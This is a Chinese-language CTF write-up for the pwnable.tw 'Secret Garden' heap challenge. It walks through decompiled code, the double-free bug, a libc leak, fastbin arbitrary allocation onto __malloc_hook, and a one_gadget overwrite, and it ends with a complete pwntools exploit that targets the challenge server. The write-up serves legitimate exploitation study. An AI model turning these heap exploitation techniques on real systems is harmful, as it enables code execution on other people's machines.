## 检查

```
$ file secretgarden 
secretgarden: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=cc989aba681411cb235a53b6c5004923d557ab6a, stripped
$ checksec secretgarden 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

64位elf，动态链接，去符号表，保护全开

## 分析

### add

添加，每朵花会malloc(0x28)来存储所有信息，会malloc任意大小来存储花名，所有花的堆块地址将放到bss段 的一个list中，最多能有100朵花

```c
int add()
{
  _QWORD *flower; // rbx
  void *flower_name; // rbp
  _QWORD *v2; // rcx
  unsigned int v3; // edx
  unsigned int size[9]; // [rsp+4h] [rbp-24h]

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  size[0] = 0;
  if ( flower_num > 0x63u )
    return puts("The garden is overflow");
  flower = malloc(0x28uLL);
  *flower = 0LL;
  flower[1] = 0LL;                              // name
  flower[2] = 0LL;                              // color
  flower[3] = 0LL;
  flower[4] = 0LL;
  __printf_chk(1LL, "Length of the name :");
  if ( (unsigned int)__isoc99_scanf("%u", size) == -1 )
    exit(-1);
  flower_name = malloc(size[0]);
  if ( !flower_name )
  {
    puts("Alloca error !!");
    exit(-1);
  }
  __printf_chk(1LL, "The name of flower :");
  read(0, flower_name, size[0]);
  flower[1] = flower_name;
  __printf_chk(1LL, "The color of the flower :");
  __isoc99_scanf("%23s", flower + 2);
  *(_DWORD *)flower = 1;
  if ( flower_list[0] )
  {
    v2 = &flower_list[1];
    v3 = 1;
    while ( *v2 )
    {
      ++v3;
      ++v2;
      if ( v3 == 100 )
        goto LABEL_14;
    }
  }
  else
  {
    v3 = 0;
  }
  flower_list[v3] = flower;
LABEL_14:
  ++flower_num;
  return puts("Successful !");
}
```

### show

遍历列表，打印花的信息

```c
int show()
{
  __int64 show_num; // rbx
  __int64 v1; // rax
  __int64 v2; // rcx
  __int64 v3; // rcx

  show_num = 0LL;
  if ( flower_num )
  {
    do
    {
      v1 = flower_list[show_num];
      if ( v1 && *(_DWORD *)v1 )
      {
        v2 = *(_QWORD *)(v1 + 8);
        __printf_chk(1LL, (__int64)"Name of the flower[%u] :%s\n");
        v3 = flower_list[show_num];
        LODWORD(v1) = __printf_chk(1LL, (__int64)"Color of the flower[%u] :%s\n");
      }
      ++show_num;
    }
    while ( show_num != 100 );
  }
  else
  {
    LODWORD(v1) = puts("No flower in the garden !");
  }
  return v1;
}
```

### del

删除花，并free掉存放name的堆块，但是并没有检查花的存在位，free后也没有将指针清0

```c
int del()
{
  int result; // eax
  _DWORD *v1; // rax
  unsigned int v2; // [rsp+4h] [rbp-14h]
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( !flower_num )
    return puts("No flower in the garden");
  __printf_chk(1LL, (__int64)"Which flower do you want to remove from the garden:");
  __isoc99_scanf("%d", &v2);
  if ( v2 <= 0x63 && (v1 = (_DWORD *)flower_list[v2]) != 0LL )
  {
    *v1 = 0;
    free(*(void **)(flower_list[v2] + 8LL));
    result = puts("Successful");
  }
  else
  {
    puts("Invalid choice");
    result = 0;
  }
  return result;
}
```

### clear

如果花已经被删除，则可以用clear功能free掉对应的那个0x28大小的堆块。

```c
unsigned __int64 clear()
{
  _QWORD *v0; // rbx
  _DWORD *v1; // rdi
  unsigned __int64 v3; // [rsp+8h] [rbp-20h]

  v3 = __readfsqword(0x28u);
  v0 = flower_list;
  do
  {
    v1 = (_DWORD *)*v0;
    if ( *v0 && !*v1 )
    {
      free(v1);
      *v0 = 0LL;
      --flower_num;
    }
    ++v0;
  }
  while ( v0 != &flower_list[100] );
  puts("Done!");
  return __readfsqword(0x28u) ^ v3;
}
```

### 数据结构

每朵花的结构如下：0x28的堆块前8个字节是存在位，接下来的8个字节是name堆块的地址，接下来的0x18个字节保存颜色名字

```
    bss                                     malloc(0x28)
+----------+                +--------+--------+---------------------------+
|          |                |        |        |                           |
|  list[0] +--------------->+  0x1   | &name  |          color            |
|          |                |        |        |                           |
+----------+                +--------+---+----+---------------------------+
|          |                             |
|          |                             v
|          |                +------------+--------------------------------+
|          |                |                                             |
|          |                |          name                               |
|          |                |                                             |
|          |                +---------------------------------------------+
|          |
+----------+
```

## 漏洞点

漏洞点就是del函数里面没有检查花的存在位和清零指针，且堆块大小可控，造成了double free

## 调试模版

为了应对pie等调试升级后的全新模版：

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

#context(arch='amd64',os='linux',log_level='debug')
#context.log_level = 'debug'

debug = 1
if debug:
	elf = ELF("./secretgarden")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	io = process(elf.path,env={"LD_PRELOAD" : libc.path})
else:
	elf = ELF("./secretgarden")
	libc = ELF("./libc_64.so.6")
	io = remote("chall.pwnable.tw",10203)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))

# base addr
gdb_text_base = int(os.popen("pmap {}".format(io.pid)).readlines()[1][4:16], 16)
gdb_libc_base = int(os.popen("pmap {}| grep libc".format(io.pid)).readlines()[0][4:16], 16)

# debug function
def debug(addr=0,cmd='',PIE=True):
    if PIE: addr = gdb_text_base + addr
    log.warn("breakpoint_addr --> 0x%x" % addr)
    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 

add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
show    = lambda                :  (sla("choice : ","2"))
rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
clear   = lambda                :  (sla("choice : ","4"))



io.interactive()

```

## 利用

### 堆排布泄漏libc

我们现在拥有地址写的能力，但是不知道写哪，所以首先要做的是泄漏地址信息，思路是free一个unsortedbin，通过main_arena泄漏libc基址，因为我们del花后，存在位会清空，所以我们还是需要申请回来才能输出信息，同时add时通过read函数来获取输入，不会添加截断字符，所以满足泄漏条件

需要注意有两点：

1. 我们还需要malloc一个fastbin来防止我们的unsortedbin被top chunk合并
2. 我们再次申请的时候题目并不会用之前申请的位于flower_list[0]的0x28的堆块，会再次申请一个堆块放在flower_list[1]中，所以我们需要预备好一个0x30的堆块放到fastbin中准备使用，以免我们放入unsortedbin中的堆块被切割

这里本地的libc和题目给的libc并不一样，但是我们只需要更改`io = process(elf.path,env={"LD_PRELOAD" : libc.path})`的libc就可以强行加载我们所需的libc（猜测大版本需要一样）

那我找了一下午题目的libc版本究竟图个啥....淦

这里使用的是gdb的gef插件，看堆感觉方便一点

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

#context(arch='amd64',os='linux',log_level='debug')
#context.log_level = 'debug'

debug = 1
if debug:
	elf = ELF("./secretgarden")
	libc = ELF("./libc_64.so.6")
	io = process(elf.path,env={"LD_PRELOAD" : libc.path})
else:
	elf = ELF("./secretgarden")
	libc = ELF("./libc_64.so.6")
	io = remote("chall.pwnable.tw",10203)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))

# base addr
gdb_text_base = int(os.popen("pmap {}".format(io.pid)).readlines()[1][4:16], 16)
gdb_libc_base = int(os.popen("pmap {}| grep libc".format(io.pid)).readlines()[0][4:16], 16)

# debug function
def debug(addr=0,cmd='',PIE=True):
    if PIE: addr = gdb_text_base + addr
    log.warn("breakpoint_addr --> 0x%x" % addr)
    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 

add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
show    = lambda                :  (sla("choice : ","2"))
rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
clear   = lambda                :  (sla("choice : ","4"))

#leak libc
add(500,'1','1')
add(0x28,'2','2')
add(10,'3','3')
rm(0);rm(1)
add(500,'','4')
show()
ru("flower[3] :")
libc_addr = uu64(io.recv(6))-0x3c3b0a

leak("libc",libc_addr)
leak("gdb_libc",gdb_libc_base)
debug(0x107b,'heap chunks\nheap bins')
show()

io.interactive()
```

### 任意地址分配修改__malloc_hook

原理学习：[fastbin-arbitrary-alloc](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#arbitrary-alloc)

因为libc中常利用的函数指针为\__malloc_hook和__free_hook，并且题目中的DoubleFree还需要构造size大小合适的伪堆块，所以需要动态调试观察这两个函数指针附近是否可以满足伪堆块的利用条件：

```python
#debug(0x107b,"x /200bx "+hex(gdb_libc_base+libc.symbols['__free_hook']-0x50))
debug(0x107b,"x /200bx "+hex(gdb_libc_base+libc.symbols['__malloc_hook']-0x50))
```

__free\_hook指针周围都是0，但是\_\_malloc\_hook周围有值可以错位构造出一个合法的size：0x000000000000007f

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-secret-garden-1.png)

因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。

```c
##define fastbin_index(sz)                                                      \
    ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```

故我们可以构造一个位于__malloc_hook-0x23处，fastbin索引为5的size为0x70的fake chunk，而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

#context(arch='amd64',os='linux',log_level='debug')
#context.log_level = 'debug'

debug = 1
if debug:
	elf = ELF("./secretgarden")
	libc = ELF("./libc_64.so.6")
	io = process(elf.path,env={"LD_PRELOAD" : libc.path})
else:
	elf = ELF("./secretgarden")
	libc = ELF("./libc_64.so.6")
	io = remote("chall.pwnable.tw",10203)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))

# base addr
gdb_text_base = int(os.popen("pmap {}".format(io.pid)).readlines()[1][4:16], 16)
gdb_libc_base = int(os.popen("pmap {}| grep libc".format(io.pid)).readlines()[0][4:16], 16)

# debug function
def debug(addr=0,cmd='',PIE=True):
    if PIE: addr = gdb_text_base + addr
    log.warn("breakpoint_addr --> 0x%x" % addr)
    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 

add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
show    = lambda                :  (sla("choice : ","2"))
rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
clear   = lambda                :  (sla("choice : ","4"))

#leak libc
add(500,'1','1')
add(0x28,'2','2')
add(10,'3','3')
rm(0);rm(1)
add(500,'','4')
show()
ru("flower[3] :")
libc_addr = uu64(io.recv(6))-0x3c3b0a
leak("libc",libc_addr)
leak("gdb_libc",gdb_libc_base)

malloc_hook = libc_addr + libc.symbols['__malloc_hook']
fake_chunk = malloc_hook-0x23
add(0x60,'1','1')
add(0x60,'1','1')
rm(4);rm(5);rm(4)
add(0x60,p64(fake_chunk),'1')
add(0x60,'1','1')
add(0x60,'1','1')
add(0x60,'a'*19+p64(0xdeadbeef),'1')
debug(0x107b,"x /200bx "+hex(libc_addr+libc.symbols['__malloc_hook']-0x50))
add(10,'1','1')

io.interactive()

```

即可成功劫持控制流到0xdeadbeef

### one_gadget利用约束

因为只能去修改__malloc_hook，而malloc函数的参数一般为数值，所以如果基本无法利用system函数，将数值利用成字符串地址，因为一旦有小数值就会产生非法地址访问。最终还是只能选择one_gadget。

本题的libc有4个one_gadget

```
$ one_gadget libc_64.so.6 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

调试：

```python
debug(0xc65)
```

调试发现约束都不满足

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-secret-garden-2.png)

参考wp说由于`malloc`或者`free`的时候会调用`malloc_printerr`函数打印错误信息，因此我们可以通过`double free`来触发`malloc_printerr`从而触发`malloc`函数，进而执行`malloc_hook`。这时`one_gadget`中的`rsp+0x50==0`的条件就满足了。

但是这里我本地没有触发成功，远程倒是直接打通了...不清楚原因

## exp

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

#context(arch='amd64',os='linux',log_level='debug')
context.log_level = 'debug'

debug = 0
if debug:
	elf = ELF("./secretgarden")
	libc = ELF("./libc_64.so.6")
	io = process(elf.path,env={"LD_PRELOAD" : libc.path})
else:
	elf = ELF("./secretgarden")
	libc = ELF("./libc_64.so.6")
	io = remote("chall.pwnable.tw",10203)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))

add     = lambda len,name,color :  (sla("choice : ","1"),sla("name :",str(len)),sla("flower :",name),sla("flower :",color))
show    = lambda                :  (sla("choice : ","2"))
rm      = lambda num            :  (sla("choice : ","3"),sla("garden:",str(num)))
clear   = lambda                :  (sla("choice : ","4"))

#leak libc
add(500,'1','1')
add(0x28,'2','2')
add(10,'3','3')
rm(0);rm(1)
add(500,'','4')
show()
ru("flower[3] :")
libc_addr = uu64(io.recv(6))-0x3c3b0a
leak("libc",libc_addr)

#get shell
malloc_hook = libc_addr + libc.symbols['__malloc_hook']
fake_chunk = malloc_hook-0x23
one_gadegt_addr = libc_addr + 0xef6c4
add(0x60,'1','1')
add(0x60,'1','1')
rm(4);rm(5);rm(4)
add(0x60,p64(fake_chunk),'1')
add(0x60,'1','1')
add(0x60,'1','1')
add(0x60,'a'*19+p64(one_gadegt_addr),'1')

rm(5)
rm(5)


io.interactive()

```



参考：

- [和媳妇一起学Pwn 之 Secret Garden](https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/)
- [pwnable.tw中的secretgarden](https://www.lyyl.online/2019/09/27/pwnable-tw%E4%B8%AD%E7%9A%84secretgarden/)

## fastbin-size

32位：

| gef fastbin item           | chunk size | data interval         | fake chunk size |
| :------------------------- | :--------- | :-------------------- | :-------------- |
| Fastbins[idx=0, size=0x8]  | 0x10       | [0x01,0x0c] , [1,12]  | [0x10,0x17]     |
| Fastbins[idx=1, size=0x10] | 0x18       | [0x0d,0x14] , [13,20] | [0x18,0x1f]     |
| Fastbins[idx=2, size=0x18] | 0x20       | [0x15,0x1c] , [21,28] | [0x20,0x27]     |
| Fastbins[idx=3, size=0x20] | 0x28       | [0x1d,0x24] , [29,36] | [0x28,0x2f]     |
| Fastbins[idx=4, size=0x28] | 0x30       | [0x25,0x2c] , [37,44] | [0x30,0x37]     |
| Fastbins[idx=5, size=0x30] | 0x38       | [0x2d,0x34] , [45,52] | [0x38,0x3f]     |
| Fastbins[idx=6, size=0x38] | 0x40       | [0x35,0x3c] , [53,60] | [0x40,0x47]     |

64 位：

| gef fastbin item           | chunk size | data interval           | fake chunk size |
| :------------------------- | :--------- | :---------------------- | :-------------- |
| Fastbins[idx=0, size=0x10] | 0x20       | [0x01,0x18] , [1,24]    | [0x20,0x2f]     |
| Fastbins[idx=1, size=0x20] | 0x30       | [0x19,0x28] , [25,40]   | [0x30,0x3f]     |
| Fastbins[idx=2, size=0x30] | 0x40       | [0x29,0x38] , [41,56]   | [0x40,0x4f]     |
| Fastbins[idx=3, size=0x40] | 0x50       | [0x39,0x48] , [57,72]   | [0x50,0x5f]     |
| Fastbins[idx=4, size=0x50] | 0x60       | [0x49,0x58] , [73,88]   | [0x60,0x6f]     |
| Fastbins[idx=5, size=0x60] | 0x70       | [0x59,0x68] , [89,104]  | [0x70,0x7f]     |
| Fastbins[idx=6, size=0x70] | 0x80       | [0x69,0x78] , [105,120] | [0x80,0x8f]     |